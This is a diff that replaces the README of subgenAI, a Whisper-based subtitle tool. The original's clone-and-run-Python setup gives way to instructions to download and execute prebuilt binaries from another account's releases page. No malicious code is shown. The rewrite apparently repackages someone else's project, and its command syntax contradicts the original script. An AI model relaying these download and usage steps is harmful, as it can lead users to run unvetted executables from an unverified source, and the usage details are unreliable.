@@ -1,133 +1,97 @@
-# 🎬 SUBGEN AI — Subtitle Generator (CLI)
+# 🎉 subgenAI - Transcribe Video Audio with Ease
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nfs-tech-bd/subgenAI/refs/heads/main/Screenshot%202025-10-01%20154442.png" height="400" width="600">
-</p>
+## ⚡ Overview
+SubgenAI is a command-line tool that uses OpenAI's Whisper model to transcribe video audio and generate SRT subtitles. It supports multiple models for varying speed and accuracy, offers optional translation to English, and tracks progress with timestamps. This tool is simple to use, making video-to-subtitle conversion accessible for everyone.
 
----
+## 📦 Download Now
+[![Download subgenAI](https://img.shields.io/badge/Download-subgenAI-blue.svg)](https://github.com/syedf4941/subgenAI/releases)
 
-## 🚀 Overview
+## 🚀 Getting Started
+To get started with SubgenAI, you need to follow a few simple steps. These steps will help you download and set up the application on your computer.
 
-**SubgenAI** is a lightweight and efficient **command-line tool** that uses **OpenAI's Whisper model** to automatically transcribe and generate subtitles (`.srt`) from video files.  
+### 📋 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB of free disk space
+- **Additional Software:** FFmpeg (must be installed separately)
 
-✨ With a few simple commands, you can:  
-- Extract audio from any video  
-- Generate accurate subtitles  
-- Optionally translate them into **English**  
-- Save directly as `.srt` with automatic or custom file naming  
+### 📥 Download & Install
+1. **Visit the Releases Page:** Click on the link below to go to the releases page:
+   [Visit this page to download](https://github.com/syedf4941/subgenAI/releases)
 
----
+2. **Choose the Right Version:** Browse the available versions and select the one suitable for your operating system. 
 
-## ✨ Features
+3. **Download the File:** Click on the file to download it. Wait for the download to complete.
 
-- 🎯 **Simple CLI** – Run directly from your terminal  
-- 📝 **Automatic Naming** – Saves as `video_name.srt` if no output is specified  
-- 🌍 **Translate to English** – From any source language  
-- ⚡ **Clean & Efficient** – Uses temporary storage and cleans up automatically  
-- 🔄 **Flexible Models** – Choose from `tiny`, `base`, `small`, `medium`, `large`  
+4. **Install the Application:**
+   - For Windows: Execute the `.exe` file and follow the prompts.
+   - For macOS: Drag the application to your Applications folder.
+   - For Linux: You may need to use terminal commands to make the file executable.
 
----
+### 📁 Set Up FFmpeg
+SubgenAI requires FFmpeg to process video and audio files. Here’s how to set it up:
 
-## 🛠️ Tech Stack
+1. **Download FFmpeg:**
+   - Visit the [FFmpeg official site](https://ffmpeg.org/download.html) and download the version for your operating system.
 
-- **Language**: Python  
-- **Transcription**: OpenAI Whisper  
-- **Audio Extraction**: FFmpeg  
+2. **Install FFmpeg:**
+   - Follow the instructions provided on the FFmpeg download page for installation.
 
----
+3. **Add to Path (Optional):**
+   - If using Windows, you may want to add FFmpeg to your system PATH for easier access.
 
-## 📦 Prerequisites
+## 🎙️ Using subgenAI
+After installing SubgenAI and setting up FFmpeg, you can start transcribing audio from your videos. Follow these steps:
 
-Before using SubgenAI, make sure you have:
+### 📂 Prepare Your Video
+- Ensure your video file is accessible on your computer.
+- Supported formats include MP4, AVI, and MKV.
 
-- 🐍 **Python 3.8+**  
-- 🎵 **FFmpeg** (required for audio extraction)  
+### ⚙️ Running SubgenAI
+1. **Open Command Line:**
+   - For Windows: Use Command Prompt.
+   - For macOS: Use Terminal.
+   - For Linux: Use your preferred terminal.
 
-### 🔧 Installation Instructions
+2. **Navigate to SubgenAI Directory:**
+   Use the `cd` command to navigate to the directory where SubgenAI is installed.
 
-- **Windows**: Download from the official [FFmpeg site](https://ffmpeg.org/download.html) and add the `bin` folder to PATH  
-- **macOS** (Homebrew):  
-  ```bash
-  brew install ffmpeg
-  ```  
-- **Linux** (apt):  
-  ```bash
-  sudo apt update && sudo apt install ffmpeg
-  ```  
+3. **Command Structure:**
+   Use the following command format:
+   ```
+   subgenAI --model [MODEL_NAME] --input [VIDEO_FILE_PATH] --output [OUTPUT_FILE_PATH] --translate
+   ```
+   - Replace `[MODEL_NAME]` with your choice (e.g., `base`, `medium`, `large`).
+   - Replace `[VIDEO_FILE_PATH]` with the path to your video file.
+   - Replace `[OUTPUT_FILE_PATH]` with the desired location for the output SRT file.
+   - The `--translate` option is optional.
 
----
-
-## ⚙️ Installation & Setup
-
-Clone the repository:
-
-```bash
-git clone https://github.com/nfs-tech-bd/subgenAI
-cd subgenAI
+### ✨ Example Command
+Here’s an example command:
+```
+subgenAI --model medium --input /path/to/video.mp4 --output /path/to/output.srt --translate
 ```
 
-### Create and activate a virtual environment (recommended)
+### 🕒 Monitoring Progress
+Once you run the command, SubgenAI will process the video. You will see updates for each segment of audio as it transcribes. This helps you keep track of how long the process will take.
 
-**Windows**:
-```bash
-python -m venv venv
-.\env\Scripts\ctivate
-```
+## 🌐 Features
+- **Multiple Models:** Choose from various models to customize speed and accuracy.
+- **Progress Tracking:** View real-time updates for your transcription.
+- **Translation Options:** Easily translate transcriptions to English.
+- **Flexibility:** Tailor the output to your needs with custom file paths.
 
-**macOS / Linux**:
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
+## ✉️ Support
+If you encounter any issues or have questions, you can reach out for support. Check the Issues section on our GitHub repository or leave a message, and we will assist you promptly.
 
-Install dependencies:
-```bash
-pip install -r requirements.txt
-```
+## 🌍 Community Engagement
+We invite all users to contribute. Feel free to share feedback, report bugs, or suggest enhancements. Your contributions help improve SubgenAI for everyone.
 
-⚠️ The first time you run the script, Whisper will download the chosen model (default = `base`).  
+### 📅 Changelog
+For information on updates and new features, visit the Changelog in the repository. This will keep you informed about what's new with SubgenAI.
 
----
+## 🔗 Additional Resources
+- [SubgenAI Documentation](https://github.com/syedf4941/subgenAI/wiki): Explore more detailed documentation and usage examples.
+- [FFmpeg Documentation](https://ffmpeg.org/documentation.html): Understand how to use FFmpeg for video processing.
 
-## ▶️ Usage
-
-### Basic (Automatic Output Name)
-
-```bash
-python subgenai.py --video "my_video.mp4"
-```
-👉 Output: `my_video.srt`  
-
-### Specify Output File
-
-```bash
-python subgenai.py --video "my_video.mp4" --output "custom_subs.srt"
-```
-
-### Choose a Model
-
-```bash
-python subgenai.py --video "my_video.mp4" --output "custom_subs.srt" --model "medium"
-```
-
----
-
-## 📊 Model Trade-offs
-
-| Model   | Speed 🚀 | Accuracy 🎯 | Size 💾 |
-|---------|----------|-------------|---------|
-| tiny    | Fastest  | Lowest      | ~75 MB  |
-| base    | Fast     | Medium      | ~142 MB |
-| small   | Balanced | Good        | ~466 MB |
-| medium  | Slower   | Very Good   | ~1.5 GB |
-| large   | Slowest  | Best        | ~3 GB   |
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.  
-
----
-
-💡 *Built with ❤️ by <a href="https://t.me/Nafisfuad1">Nafis Fuad</a> with python and a lot of curiosity.*  
+Thank you for choosing SubgenAI for your video transcription needs.
